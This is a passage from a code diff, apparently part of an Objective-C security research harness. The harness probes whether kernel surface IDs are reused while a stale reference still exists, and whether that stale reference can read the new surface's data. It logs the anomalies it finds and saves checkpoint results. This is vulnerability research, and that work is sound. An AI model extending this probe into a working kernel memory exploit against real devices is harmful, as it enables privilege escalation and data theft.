+                    if (staleWorks && idD2 != idD) {
+                        // B still valid, new surface got different ID — refcount protection works
+                        log(@"IDORACLE: ID not reused while stale ref exists — kernel refcount protects");
+                    } else if (staleWorks && idD2 == idD) {
+                        anomalies++;
+                        log(@"IDORACLE: ANOMALY — ID reused while stale reference still alive!");
+
+                        // Check if B now sees D2's data
+                        sym.lock(surfD2, 0, NULL);
+                        void *d2Base = sym.getBase(surfD2);
+                        if (d2Base) {
+                            uint32_t *d2px = (uint32_t *)d2Base;
+                            for (int i = 0; i < 64*64; i++) d2px[i] = 0xDDDDDDDD;
+                        }
+                        sym.unlock(surfD2, 0, NULL);
+
+                        kr = sym.lock(refB, 0, NULL);
+                        if (kr == 0) {
+                            void *bBase2 = sym.getBase(refB);
+                            if (bBase2) {
+                                uint32_t bVal2 = ((uint32_t *)bBase2)[0];
+                                log([NSString stringWithFormat:@"IDORACLE: Stale ref B now reads 0x%08X (D2 wrote 0xDDDDDDDD)", bVal2]);
+                                if (bVal2 == 0xDDDDDDDD) {
+                                    anomalies++;
+                                    log(@"IDORACLE: CRITICAL — stale reference accesses NEW surface data!");
+                                }
+                            }
+                            sym.unlock(refB, 0, NULL);
+                        }
+                    }
+
+                    CFRelease(surfD2);
+                    CFRelease(refB);
+                }
+            }
+
+        idoracle_done:;
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"IDORACLE: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);
+
+            NSDictionary *results = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"elapsed": @(elapsed)
+            };
+            isr_checkpoint(@"ISR-IDOracle-checkpoint.json", results);
+            isr_unload(&sym);
+            done(results);
+        }
+    });
+}
